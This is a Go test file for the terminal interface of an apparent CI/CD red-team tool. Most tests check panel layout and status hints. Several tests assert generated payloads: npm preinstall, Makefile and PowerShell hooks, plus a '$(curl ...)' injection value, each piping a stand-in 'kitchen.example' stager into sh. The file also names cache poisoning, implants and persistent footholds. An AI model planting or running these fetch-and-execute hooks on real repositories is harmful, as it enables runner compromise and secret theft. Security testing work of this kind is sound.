// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package tui

import (
	"strings"
	"testing"
	"time"

	"charm.land/lipgloss/v2"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
	"github.com/boostsecurityio/smokedmeat/internal/counter"
	"github.com/boostsecurityio/smokedmeat/internal/models"
)

func stubRenderers() ContentRenderers {
	return ContentRenderers{
		Tree: func(w, h int) string {
			return padToSize("TREE", w, h)
		},
		Menu: func(w, h int) string {
			return padToSize("MENU", w, h)
		},
		Loot: func(w, h int) string {
			return padToSize("LOOT", w, h)
		},
		Activity: func(w, h int, _ bool) string {
			return padToSize("ACTIVITY", w, h)
		},
		Agent: func(w, h int) string {
			return padToSize("AGENT", w, h)
		},
		HasLoot: true,
	}
}

func padToSize(label string, w, h int) string {
	lines := make([]string, h)
	for i := range lines {
		if i == 0 && w >= len(label) {
			lines[i] = label + strings.Repeat(" ", w-len(label))
		} else {
			lines[i] = strings.Repeat(" ", w)
		}
	}
	return strings.Join(lines, "\n")
}

func fixedHeader(w int) string {
	return "HEADER" + strings.Repeat(" ", w-6)
}

func fixedInput(w int) string {
	line1 := strings.Repeat("─", w)
	line2 := "❯ command" + strings.Repeat(" ", w-11)
	line3 := strings.Repeat("─", w)
	return line1 + "\n" + line2 + "\n" + line3
}

func fixedStatus(w int) string {
	return "STATUS" + strings.Repeat(" ", w-6)
}

func TestStickersLayout_InputHeightConstant(t *testing.T) {
	sl := NewStickersLayout()
	sl.Resize(120, 40)
	renderers := stubRenderers()

	inputNoHint := fixedInput(120)
	inputWithHint := fixedInput(120)

	out1 := sl.RenderIdle(fixedHeader(120), inputNoHint, fixedStatus(120), false, renderers, false, "")
	out2 := sl.RenderIdle(fixedHeader(120), inputWithHint, fixedStatus(120), false, renderers, false, "")

	lines1 := strings.Split(out1, "\n")
	lines2 := strings.Split(out2, "\n")

	assert.Equal(t, len(lines1), len(lines2), "output height should not change with hints")

	headerLine1 := lines1[0]
	headerLine2 := lines2[0]
	assert.Equal(t, headerLine1, headerLine2, "header position should not shift")
}

func TestStickersLayout_ResizeReflows(t *testing.T) {
	sl := NewStickersLayout()
	renderers := stubRenderers()

	sl.Resize(120, 40)
	out1 := sl.RenderIdle(fixedHeader(120), fixedInput(120), fixedStatus(120), false, renderers, false, "")

	sl.Resize(200, 60)
	out2 := sl.RenderIdle(fixedHeader(200), fixedInput(200), fixedStatus(200), false, renderers, false, "")

	lines1 := strings.Split(out1, "\n")
	lines2 := strings.Split(out2, "\n")

	assert.Equal(t, 40, len(lines1), "should fill terminal height at 40")
	assert.Equal(t, 60, len(lines2), "should fill terminal height at 60")
}

func TestStickersLayout_NarrowCollapse(t *testing.T) {
	sl := NewStickersLayout()
	renderers := stubRenderers()

	sl.Resize(70, 30)
	assert.True(t, sl.IsNarrow())

	out := sl.RenderIdle(fixedHeader(70), fixedInput(70), fixedStatus(70), false, renderers, false, "")
	lines := strings.Split(out, "\n")

	require.Equal(t, 30, len(lines), "should fill terminal height")
	assert.NotContains(t, out, "MENU", "narrow mode should not show menu panel")
	assert.NotContains(t, out, "LOOT", "narrow mode should not show loot panel")
	assert.Contains(t, out, "TREE", "narrow mode should show tree")
}

func TestStickersLayout_WideShowsBothColumns(t *testing.T) {
	sl := NewStickersLayout()
	renderers := stubRenderers()

	sl.Resize(120, 40)
	assert.False(t, sl.IsNarrow())

	out := sl.RenderIdle(fixedHeader(120), fixedInput(120), fixedStatus(120), false, renderers, false, "")

	assert.Contains(t, out, "TREE", "wide mode should show tree")
	assert.Contains(t, out, "MENU", "wide mode should show menu")
	assert.Contains(t, out, "LOOT", "wide mode should show loot")
	assert.Contains(t, out, "ACTIVITY", "should show activity")
}

func TestStickersLayout_AgentView(t *testing.T) {
	sl := NewStickersLayout()
	renderers := stubRenderers()

	sl.Resize(120, 40)
	out := sl.RenderAgent(fixedHeader(120), fixedInput(120), fixedStatus(120), false, renderers, false, "")

	assert.Contains(t, out, "TREE", "agent view should show tree")
	assert.Contains(t, out, "AGENT", "agent view should show agent panel")
	assert.Contains(t, out, "LOOT", "agent view should show loot")
	assert.Contains(t, out, "MENU", "agent view should show menu")
	assert.Contains(t, out, "ACTIVITY", "agent view should show activity")
}

func TestStickersLayout_RenderStackedPanels_CollapsesEmptyLoot(t *testing.T) {
	sl := NewStickersLayout()

	var withLootMenuHeight, withLootLootHeight int
	sl.renderStackedPanels(60, 20, ContentRenderers{
		Menu: func(w, h int) string {
			withLootMenuHeight = h
			return padToSize("MENU", w, h)
		},
		Loot: func(w, h int) string {
			withLootLootHeight = h
			return padToSize("LOOT", w, h)
		},
		HasLoot: true,
	})

	var noLootMenuHeight, noLootLootHeight int
	sl.renderStackedPanels(60, 20, ContentRenderers{
		Menu: func(w, h int) string {
			noLootMenuHeight = h
			return padToSize("MENU", w, h)
		},
		Loot: func(w, h int) string {
			noLootLootHeight = h
			return padToSize("LOOT", w, h)
		},
		HasLoot: false,
	})

	assert.Greater(t, noLootMenuHeight, withLootMenuHeight)
	assert.Less(t, noLootLootHeight, withLootLootHeight)
	assert.LessOrEqual(t, noLootLootHeight, 3)
}

func TestStickersLayout_FlexHeightCalculation(t *testing.T) {
	sl := NewStickersLayout()

	sl.Resize(100, 40)
	assert.Equal(t, 40-fixedOverhead, sl.FlexHeight())

	sl.Resize(100, 10)
	assert.Equal(t, 4, sl.FlexHeight(), "should clamp to minimum of 4")

	sl.Resize(100, 6)
	assert.Equal(t, 4, sl.FlexHeight(), "should clamp to minimum of 4")
}

func TestStickersLayout_FlexHeightShrinksWhenActivityExpands(t *testing.T) {
	sl := NewStickersLayout()

	sl.Resize(100, 40)
	sl.SetActivityHeight(expandedActivityHeight)

	assert.Equal(t, 40-fixedChromeHeight-expandedActivityHeight, sl.FlexHeight())
}

func TestFormatWizardContent_WrapsLongLinesToWidth(t *testing.T) {
	out := formatWizardContent("     ", "", "Current token can interact with PRs but cannot create the branch directly - contents:write is required", 40)

	for _, line := range strings.Split(out, "\n") {
		assert.LessOrEqual(t, lipgloss.Width(line), 40)
	}
}

func TestBuildWizardModal_RunnerTargetStep3WrapsLongSSHStatusAndRoute(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.wizard = &WizardState{
		Kind:               WizardKindRunnerTarget,
		Step:               3,
		RunnerTargetAction: RunnerTargetActionAutoWorkflowPush,
		PersistenceAttempt: true,
		SelectedRunnerTarget: &RunnerTargetSelection{
			Repository:            "whooli/infrastructure-definitions",
			LabelDisplay:          "linux-x64 +dynamic",
			LabelSet:              []string{"self-hosted", "linux", "x64"},
			DynamicLabelSet:       []string{"${{ needs.bootstrap.outputs.runner_label }}"},
			ObservedWorkflowPaths: []string{".github/workflows/self-hosted-trusted-sync.yml"},
			ObservedJobNames:      []string{"sync"},
		},
	}
	m.sshState = &SSHState{
		Results: []SSHTrialResult{
			{Repo: "whooli/infrastructure-definitions", Success: true, Permission: "write"},
		},
	}

	modal := m.buildWizardModal(96, 26)

	for _, line := range modal {
		assert.LessOrEqualf(t, lipgloss.Width(line), 96, "line=%q", stripANSI(line))
	}
}

func TestStickersLayout_HeaderPositionStable(t *testing.T) {
	sl := NewStickersLayout()
	renderers := stubRenderers()

	sl.Resize(120, 40)

	input3Lines := fixedInput(120)
	out := sl.RenderIdle(fixedHeader(120), input3Lines, fixedStatus(120), false, renderers, false, "")

	lines := strings.Split(out, "\n")
	require.True(t, len(lines) >= 1)
	assert.True(t, strings.HasPrefix(lines[0], "HEADER"), "first line should be header")

	lastLine := lines[len(lines)-1]
	assert.True(t, strings.HasPrefix(lastLine, "STATUS"), "last line should be status bar")
}

func TestStickersLayout_MultipleResizes(t *testing.T) {
	sl := NewStickersLayout()
	renderers := stubRenderers()

	sizes := [][2]int{{120, 40}, {80, 24}, {60, 20}, {200, 60}, {100, 35}}
	for _, size := range sizes {
		w, h := size[0], size[1]
		sl.Resize(w, h)
		out := sl.RenderIdle(fixedHeader(w), fixedInput(w), fixedStatus(w), false, renderers, false, "")
		lines := strings.Split(out, "\n")
		assert.Equal(t, h, len(lines), "output should match terminal height for %dx%d", w, h)
	}
}

func TestVulnLabel(t *testing.T) {
	tests := []struct {
		context string
		trigger string
		want    string
	}{
		{"issue_body", "", "Bash injection (issue body)"},
		{"issue_title", "", "Bash injection (issue title)"},
		{"pr_body", "", "Bash injection (PR body)"},
		{"pr_title", "", "Bash injection (PR title)"},
		{"comment_body", "", "Bash injection (comment)"},
		{"commit_message", "", "Bash injection (commit msg)"},
		{"git_branch", "", "Bash injection (branch name)"},
		{"github_script", "", "JS injection"},
		{"github_script", "issue_comment", "JS injection (comment)"},
		{"github_script", "issues", "JS injection (issue)"},
		{"github_script", "pull_request", "JS injection (PR)"},
		{"bash_run", "", "Bash injection"},
		{"bash_run", "issue_comment", "Bash injection (comment)"},
		{"bash_run", "pull_request_target", "Bash injection (PR)"},
		{"bash_run", "workflow_dispatch", "Bash injection (workflow_dispatch)"},
		{"workflow_dispatch_input", "", "Bash injection (dispatch input)"},
		{"", "", "Bash injection"},
		{"", "issues", "Bash injection (issue)"},
		{"custom_ctx", "", "Bash injection (custom_ctx)"},
	}
	for _, tt := range tests {
		t.Run(tt.context+"_"+tt.trigger, func(t *testing.T) {
			got := vulnLabel(tt.context, tt.trigger)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestWaitingTipsForMethod(t *testing.T) {
	tests := []struct {
		method  string
		keyword string
	}{
		{"Create Issue", "Issue/comment"},
		{"Add Comment", "issue_comment"},
		{"Create PR", "pull_request"},
		{"Trigger Dispatch", "actions:write"},
		{"npm install", "package.json"},
		{"Unknown Method", "payload"},
	}
	for _, tt := range tests {
		t.Run(tt.method, func(t *testing.T) {
			tips := waitingTipsForMethod(tt.method)
			require.NotEmpty(t, tips)
			found := false
			for _, tip := range tips {
				if strings.Contains(tip, tt.keyword) {
					found = true
					break
				}
			}
			assert.True(t, found, "tips for %q should mention %q, got %v", tt.method, tt.keyword, tips)
		})
	}
}

func TestBuildWizardStep3LOTP_PreviewBoxKeepsInnerGutter(t *testing.T) {
	m := NewModel(Config{SessionID: "test", KitchenExternalURL: "https://kitchen.example"})
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository:  "messypoutine/gravy-overflow",
			LOTPTool:    "npm",
			LOTPTargets: []string{"package.json"},
		},
	}

	lines := m.buildWizardStep3LOTP(80)

	var (
		sawFilename bool
		sawBoxLine  bool
	)
	for i, line := range lines {
		plain := stripANSI(line)
		if strings.Contains(plain, "package.json") &&
			i+1 < len(lines) &&
			strings.Contains(stripANSI(lines[i+1]), "╭") {
			sawFilename = true
			assert.Equal(t, 78, lipgloss.Width(line))
			assert.True(t, strings.HasPrefix(plain, "    "))
			assert.True(t, strings.HasSuffix(plain, "  "))
			continue
		}
		if !strings.ContainsAny(plain, "╭│╰") {
			continue
		}
		sawBoxLine = true
		assert.Equal(t, 78, lipgloss.Width(line))
		assert.True(t, strings.HasPrefix(plain, "  "))
		assert.True(t, strings.HasSuffix(plain, "  "))
	}

	assert.True(t, sawFilename, "expected LOTP preview filename")
	assert.True(t, sawBoxLine, "expected LOTP preview box")
}

func TestBuildWizardModal_LOTPShowsAdvancedOptionsBeforePreview(t *testing.T) {
	m := NewModel(Config{SessionID: "test", KitchenExternalURL: "https://kitchen.example"})
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository:        "messypoutine/gravy-overflow",
			LOTPTool:          "npm",
			LOTPTargets:       []string{"package.json"},
			CachePoisonWriter: true,
			CachePoisonVictims: []cachepoison.VictimCandidate{
				{Workflow: ".github/workflows/deploy.yml", Ready: true},
			},
		},
		DeliveryMethod: DeliveryLOTP,
	}

	out := stripANSI(strings.Join(m.buildWizardModal(90, 26), "\n"))

	assert.Contains(t, out, "Mode:")
	assert.Contains(t, out, "Callbacks:")
	assert.Contains(t, out, "Cache Poisoning:")
	assert.Contains(t, out, "Preview:")
	assert.Contains(t, out, ":mode")
	assert.Contains(t, out, "╰")
	assert.Contains(t, out, "Only proceed if you are authorized")
}

func TestBuildWizardModal_LOTPShowsPersistenceForSelfHostedOverlap(t *testing.T) {
	m := NewModel(Config{
		SessionID:          "test",
		KitchenExternalURL: "https://thoroughly-control-browsers-linear.trycloudflare.com",
	})
	m.pantry = observedSelfHostedRunnerPantry(t)
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository:  "acme/api",
			Workflow:    ".github/workflows/pr.yml",
			Job:         "build",
			RuleID:      "untrusted_checkout_exec",
			Context:     "untrusted_checkout",
			LOTPTool:    "make",
			LOTPTargets: []string{"Makefile"},
		},
		DeliveryMethod: DeliveryLOTP,
	}

	out := stripANSI(strings.Join(m.buildWizardModal(90, 26), "\n"))

	assert.Contains(t, out, "Persistence:")
	assert.Contains(t, out, "Off [p] to toggle")
	assert.Contains(t, out, ":persist")
	assert.Contains(t, out, "╰")
	assert.NotContains(t, out, "\t")
}

func TestBuildRunnerTargetStep3PersistentResidentHidesCallbackBudget(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.wizard = &WizardState{
		Kind:               WizardKindRunnerTarget,
		Step:               3,
		RunnerTargetAction: RunnerTargetActionAutoWorkflowPush,
		PersistenceAttempt: true,
		SelectedRunnerTarget: &RunnerTargetSelection{
			Repository:            "whooli/infrastructure-definitions",
			LabelDisplay:          "linux-x64 +dynamic",
			LabelSet:              []string{"self-hosted", "linux", "x64"},
			DynamicLabelSet:       []string{"${{ needs.bootstrap.outputs.runner_label }}"},
			ObservedWorkflowPaths: []string{".github/workflows/benchmark-integrity.yml"},
			ObservedJobNames:      []string{"execute"},
		},
	}
	m.sshState = &SSHState{
		Results: []SSHTrialResult{
			{Repo: "whooli/infrastructure-definitions", Success: true, Permission: "write"},
		},
	}

	out := stripANSI(strings.Join(m.buildRunnerTargetStep3Content(120), "\n"))

	assert.Contains(t, out, "Proceed only if authorized. This will push a real branch.")
	assert.Contains(t, out, "Job:")
	assert.Contains(t, out, runnerTargetWorkflowJobName())
	assert.Contains(t, out, "Seed callback:")
	assert.Contains(t, out, "Express once to confirm execution")
	assert.Contains(t, out, "Resident foothold:")
	assert.Contains(t, out, "Enabled after job exit")
	assert.NotContains(t, out, "Callbacks:")
}

func TestBuildWizardStep3LOTP_PreviewMatchesGeneratedPackageJSON(t *testing.T) {
	m := NewModel(Config{SessionID: "test", KitchenExternalURL: "https://kitchen.example"})
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository:  "messypoutine/gravy-overflow",
			LOTPTool:    "npm",
			LOTPTargets: []string{"package.json"},
		},
	}

	out := stripANSI(strings.Join(m.buildWizardStep3LOTP(140), "\n"))

	assert.Contains(t, out, `"scripts": {`)
	assert.Contains(t, out, `"preinstall": "curl -s 'https://kitchen.example/r/smokedmeat/preview-stager-id' | sh"`)
	assert.NotContains(t, out, "postinstall")
}

func TestBuildWizardStep3LOTP_PreviewMatchesGeneratedPowershellScript(t *testing.T) {
	m := NewModel(Config{SessionID: "test", KitchenExternalURL: "https://kitchen.example"})
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository:  "messypoutine/gravy-overflow",
			LOTPTool:    "powershell",
			LOTPTargets: []string{"scripts/build.ps1"},
		},
	}

	out := stripANSI(strings.Join(m.buildWizardStep3LOTP(140), "\n"))

	assert.Contains(t, out, "#!/usr/bin/env pwsh")
	assert.Contains(t, out, "sh -c 'curl -s ''https://kitchen.example/r/smokedmeat/preview-stager-id'' | sh'")
	assert.NotContains(t, out, "Invoke-WebRequest")
}

func TestBuildWizardStep3LOTP_PreviewMatchesGeneratedMakefile(t *testing.T) {
	m := NewModel(Config{SessionID: "test", KitchenExternalURL: "https://kitchen.example"})
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository: "messypoutine/gravy-overflow",
			LOTPTool:   "make",
		},
	}

	out := stripANSI(strings.Join(m.buildWizardStep3LOTP(140), "\n"))

	assert.Contains(t, out, "all:")
	assert.Contains(t, out, "@curl -s 'https://kitchen.example/r/smokedmeat/preview-stager-id' | sh")
}

func TestBuildWizardModal_LOTPHidesRawPayloadSummary(t *testing.T) {
	m := NewModel(Config{SessionID: "test", KitchenExternalURL: "https://kitchen.example"})
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository:  "messypoutine/gravy-overflow",
			LOTPTool:    "npm",
			LOTPTargets: []string{"package.json"},
		},
		DeliveryMethod: DeliveryLOTP,
		Payload:        "$(curl -s https://kitchen.example/r/smokedmeat/stg-123)",
	}

	out := stripANSI(strings.Join(m.buildWizardModal(90, 26), "\n"))

	assert.NotContains(t, out, "Payload:")
}

func TestPadRight_KeepsRequestedWidth(t *testing.T) {
	assert.Equal(t, 4, lipgloss.Width(padRight("⚠️", 4)))
}

func TestFormatWizardContent_KeepsVariationSelectorWithinWidth(t *testing.T) {
	assert.Equal(t, 4, lipgloss.Width(formatWizardContent("", "", "⚠️", 4)))
}

func TestRenderPreviewBoxContent_TruncatesLongLinesWithoutWrapping(t *testing.T) {
	box := renderPreviewBoxContent(30, []string{strings.Repeat("x", 80)})

	lines := strings.Split(stripANSI(box), "\n")
	require.Len(t, lines, 3)
	assert.Contains(t, lines[1], "...")
}

func TestRenderPreviewBoxContent_ExpandsTabsBeforeTruncating(t *testing.T) {
	box := renderPreviewBoxContent(30, []string{"\t@curl -s '" + strings.Repeat("x", 80)})

	lines := strings.Split(stripANSI(box), "\n")
	require.Len(t, lines, 3)
	assert.NotContains(t, box, "\t")
	assert.Contains(t, lines[1], "...")
}

func TestRenderWaitingView_ShowsETA(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 120
	m.waiting = NewWaitingState("stg-123", "acme/api", "V001", ".github/workflows/ci.yml", "build", "Create Issue", 0)
	m.waiting.StartTime = time.Now().Add(-12 * time.Second)

	out := stripANSI(m.renderWaitingView(24))

	assert.Contains(t, out, "Elapsed:")
	assert.Contains(t, out, "ETA:")
	assert.Contains(t, out, "stg-123")
}

func TestRenderWaitingView_ShowsWriterCacheStatus(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 120
	m.waiting = NewWaitingState("stg-123", "acme/api", "V001", ".github/workflows/lint.yml", "lint", "Add Comment", 0)
	m.waiting.CachePoison = &CachePoisonWaitingState{
		Victim:        cachepoison.VictimCandidate{Workflow: ".github/workflows/deploy.yml"},
		WriterAgentID: "agt-writer",
		WriterStatus:  &models.CachePoisonStatus{Status: "armed"},
	}

	out := stripANSI(m.renderWaitingView(24))

	assert.Contains(t, out, "Writer cache: armed")
}

func TestRenderNewStatusBar_ShowsFilterHintWhenFindingsPaneFocused(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 120
	m.view = ViewFindings
	m.phase = PhaseRecon
	m.paneFocus = PaneFocusFindings
	m.focus = FocusSessions
	m.treeNodes = []*TreeNode{{ID: "repo:acme/api", Type: TreeNodeRepo, Label: "acme/api"}}

	out := stripANSI(m.renderNewStatusBar())

	assert.Contains(t, out, "hjkl:nav")
	assert.Contains(t, out, "f:filter")
}

func TestRenderAnalysisProgressLine_StabilizesRepoProgressPosition(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 120
	m.analysisProgress = &counter.AnalysisProgressPayload{
		Phase:          analysisPhaseWorkflow,
		Message:        "Analyzing workflows",
		CurrentRepo:    "org/repo-with-a-very-long-name",
		ReposCompleted: 12,
		ReposTotal:     493,
		StartedAt:      time.Now().Add(-5 * time.Second),
		UpdatedAt:      time.Now().Add(-5 * time.Second),
	}

	out := stripANSI(m.renderAnalysisProgressLine())

	assert.Contains(t, out, "Analyzing workflows | 12/493 repos")
	assert.Contains(t, out, "| org/repo-with-a-very-long-name")
}

func TestRenderAnalysisProgressLine_FutureStartDoesNotPanic(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 120
	m.analysisProgress = &counter.AnalysisProgressPayload{
		Phase:     analysisPhaseWorkflow,
		StartedAt: time.Now().Add(5 * time.Second),
		UpdatedAt: time.Now().Add(5 * time.Second),
	}

	assert.NotPanics(t, func() {
		_ = m.renderAnalysisProgressLine()
	})
}

func TestBuildWizardStep2Content_AppTokenIssueWriteDoesNotWarn(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.tokenInfo = &TokenInfo{Value: "ghs_app_token", Type: TokenTypeInstallApp, Source: "loot:APP_TOKEN_acme"}
	m.appTokenPermissions = map[string]string{"issues": "write", "metadata": "read"}
	m.wizard = &WizardState{
		Step: 2,
		SelectedVuln: &Vulnerability{
			ID:         "V001",
			Repository: "acme/api",
			Workflow:   ".github/workflows/ci.yml",
			Context:    "issue_body",
			Trigger:    "issues",
		},
		DeliveryMethod: DeliveryIssue,
	}

	out := stripANSI(strings.Join(m.buildWizardStep2Content(90), "\n"))

	assert.Contains(t, out, "Create Issue")
	assert.NotContains(t, out, "Create Issue (token missing scope)")
}

func TestBuildWizardStep2Content_AppTokenWithoutPRWriteShowsBlocked(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.tokenInfo = &TokenInfo{Value: "ghs_app_token", Type: TokenTypeInstallApp, Source: "loot:APP_TOKEN_acme"}
	m.appTokenPermissions = map[string]string{"issues": "write", "metadata": "read"}
	m.wizard = &WizardState{
		Step: 2,
		SelectedVuln: &Vulnerability{
			ID:         "V001",
			Repository: "acme/api",
			Workflow:   ".github/workflows/ci.yml",
			Context:    "pr_body",
			Trigger:    "pull_request_target",
		},
		DeliveryMethod: DeliveryAutoPR,
	}

	out := stripANSI(strings.Join(m.buildWizardStep2Content(90), "\n"))

	assert.Contains(t, out, "Create PR (blocked)")
}

func TestBuildWizardStep2Content_ConfirmedDeliveryUsesRecommendedLabelOnly(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT}
	m.wizard = &WizardState{
		Step: 2,
		SelectedVuln: &Vulnerability{
			ID:         "V001",
			Repository: "acme/api",
			Workflow:   ".github/workflows/ci.yml",
			Context:    "pr_body",
			Trigger:    "pull_request_target",
		},
		DeliveryMethod: DeliveryAutoPR,
		Preflight: &counter.DeployPreflightResponse{
			Capabilities: map[string]counter.DeployPreflightCapability{
				deployCapabilityPR: {State: deployStateConfirmed},
			},
		},
	}

	out := stripANSI(strings.Join(m.buildWizardStep2Content(90), "\n"))

	assert.Contains(t, out, "Create PR Recommended")
	assert.NotContains(t, out, "previously confirmed")
}

func TestHelpCommandsForPhase(t *testing.T) {
	tests := []struct {
		phase   Phase
		present string
		absent  string
	}{
		{PhaseSetup, "set token", "sessions"},
		{PhaseRecon, "1-5", "sessions"},
		{PhasePostExploit, "order <...>", "1-5"},
		{PhasePivot, "order <...>", "1-5"},
		{PhaseWizard, "help", "analyze"},
		{PhaseWaiting, "license", "graph"},
	}
	for _, tt := range tests {
		t.Run(tt.phase.String(), func(t *testing.T) {
			cmds := helpCommandsForPhase(tt.phase)
			joined := strings.Join(cmds, "\n")
			assert.Contains(t, joined, tt.present, "phase %s should include %q", tt.phase, tt.present)
			assert.NotContains(t, joined, tt.absent, "phase %s should not include %q", tt.phase, tt.absent)
			if tt.phase == PhaseRecon || tt.phase == PhasePostExploit || tt.phase == PhasePivot {
				assert.Contains(t, joined, "purge <target>", "phase %s should include purge help", tt.phase)
			}
		})
	}
}

func TestRenderNewStatusBar_ShowsPersistentTarget(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 120
	m.targetType = "repo"
	m.target = "acme/private-infra"
	m.view = ViewFindings

	out := stripANSI(m.renderNewStatusBar())

	assert.Contains(t, out, "repo:acme/private-infra")
	assert.Contains(t, out, "🎯")
	assert.NotContains(t, out, "Target:")
}

func TestPaneNavHints_ShowsDeepAnalyzeShortcutForSelectedRepo(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.focus = FocusSessions
	m.paneFocus = PaneFocusFindings
	root := &TreeNode{ID: "root", Expanded: true}
	repo := &TreeNode{ID: "repo:acme/private-infra", Type: TreeNodeRepo, Label: "acme/private-infra", Parent: root}
	root.Children = []*TreeNode{repo}
	m.treeRoot = root
	m.ReflattenTree()

	hints := stripANSI(m.paneNavHints())

	assert.Contains(t, hints, "d:deep")
	assert.Contains(t, hints, "s:target")
}

func TestPaneNavHints_HidesExploitShortcutForAnalyzeOnlyFinding(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.focus = FocusSessions
	m.paneFocus = PaneFocusFindings
	m.vulnerabilities = []Vulnerability{{
		ID:         "V001",
		Repository: "acme/api",
		Workflow:   ".github/workflows/pr.yml",
		Job:        "build",
		Line:       12,
		RuleID:     "pr_runs_on_self_hosted",
		Context:    "bash_run",
	}}

	root := &TreeNode{ID: "root", Expanded: true}
	repo := &TreeNode{ID: "repo:acme/api", Type: TreeNodeRepo, Label: "acme/api", Expanded: true, Parent: root}
	vuln := &TreeNode{
		ID:     "V001",
		Type:   TreeNodeVuln,
		Label:  "Self-hosted runner",
		RuleID: "pr_runs_on_self_hosted",
		Parent: repo,
		Properties: map[string]interface{}{
			"path":    ".github/workflows/pr.yml",
			"line":    12,
			"context": "bash_run",
			"job":     "build",
		},
	}
	root.Children = []*TreeNode{repo}
	repo.Children = []*TreeNode{vuln}
	m.treeRoot = root
	m.ReflattenTree()
	require.True(t, m.TreeSelectByID("V001"))

	hints := stripANSI(m.paneNavHints())

	assert.NotContains(t, hints, "x:exploit")
	assert.Contains(t, hints, "K:chain")
}

func TestStatusBar_PivotedOnlyWhenTokenDiffers(t *testing.T) {
	m := Model{width: 120}
	token := "ghp_abcdef1234567890abcdef1234567890abcd"
	m.tokenInfo = &TokenInfo{Value: token, Type: TokenTypeClassicPAT, Source: "config"}
	m.initialTokenInfo = &TokenInfo{Value: token, Type: TokenTypeClassicPAT, Source: "pat"}

	status := m.renderNewStatusBar()
	assert.NotContains(t, status, "pivoted", "same token value should not show (pivoted)")

	m.tokenInfo = &TokenInfo{Value: "ghs_different123456", Type: TokenTypeInstallApp, Source: "loot:app"}
	status = m.renderNewStatusBar()
	assert.Contains(t, status, "pivoted", "different token value should show (pivoted)")
}

func TestRenderNewStatusBar_ShowsThemeAndLogHintsInAgentView(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 180
	m.view = ViewAgent
	m.focus = FocusSessions

	out := stripANSI(m.renderNewStatusBar())

	assert.Contains(t, out, "/:jump")
	assert.Contains(t, out, "?:help")
	assert.Contains(t, out, "Shift+L:log")
	assert.Contains(t, out, "Shift+I:implants")
	assert.Contains(t, out, "t:theme")
}

func TestRenderNewStatusBar_PrioritizesThemeHintAtWalkthroughWidth(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 140
	m.view = ViewFindings
	m.focus = FocusSessions
	m.tokenInfo = &TokenInfo{
		Value: "ghp_abcdef1234567890abcdef1234567890abcd",
		Type:  TokenTypeClassicPAT,
		Owner: "whooli",
	}
	m.targetType = "org"
	m.target = "whooli"

	out := stripANSI(m.renderNewStatusBar())

	assert.Contains(t, out, "/:jump")
	assert.Contains(t, out, "?:help")
	assert.Contains(t, out, "Shift+L:log")
	assert.Contains(t, out, "Shift+I:implants")
}

func TestRenderNewStatusBar_HidesThemeAndLogHintsWhenInputFocused(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 140
	m.view = ViewFindings
	m.focus = FocusInput
	m.tokenInfo = &TokenInfo{
		Value: "ghp_abcdef1234567890abcdef1234567890abcd",
		Type:  TokenTypeClassicPAT,
		Owner: "whooli",
	}
	m.targetType = "org"
	m.target = "whooli"

	out := stripANSI(m.renderNewStatusBar())

	assert.Contains(t, out, "/:jump")
	assert.Contains(t, out, "?:help")
	assert.NotContains(t, out, "Shift+L:log")
	assert.NotContains(t, out, "Shift+I:implants")
	assert.NotContains(t, out, "t:theme")
}

func TestRenderNewStatusBar_HidesBackHintAtSetupBackFloor(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 120
	m.view = ViewSetupWizard
	m.setupWizard = &SetupWizardState{
		Step:          5,
		BackStepFloor: 5,
		TokenSubStep:  setupTokenSubStepChoice,
	}

	out := stripANSI(m.renderNewStatusBar())

	assert.NotContains(t, out, "Tab:back")
}

func TestRenderNewStatusBar_ShowsBackHintForSetupSubstepBack(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.width = 120
	m.view = ViewSetupWizard
	m.setupWizard = &SetupWizardState{
		Step:          5,
		BackStepFloor: 5,
		TokenSubStep:  setupTokenSubStepWarning,
	}

	out := stripANSI(m.renderNewStatusBar())

	assert.Contains(t, out, "Tab:back")
}

func TestGlobalStatusHintsForWidth_DropsThemeBeforeImplants(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.view = ViewFindings
	m.focus = FocusSessions

	full := m.globalStatusHintsForWidth(-1)
	fullWidth := lipgloss.Width(full)

	var tight string
	for width := 1; width < fullWidth; width++ {
		hints := stripANSI(m.globalStatusHintsForWidth(width))
		if strings.Contains(hints, "Shift+I:implants") && !strings.Contains(hints, "t:theme") {
			tight = hints
			break
		}
	}

	require.NotEmpty(t, tight)
	assert.Contains(t, tight, "Shift+I:implants")
	assert.NotContains(t, tight, "t:theme")
}

func BenchmarkStickersLayout_Render(b *testing.B) {
	sl := NewStickersLayout()
	sl.Resize(120, 40)
	renderers := stubRenderers()
	header := fixedHeader(120)
	input := fixedInput(120)
	status := fixedStatus(120)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
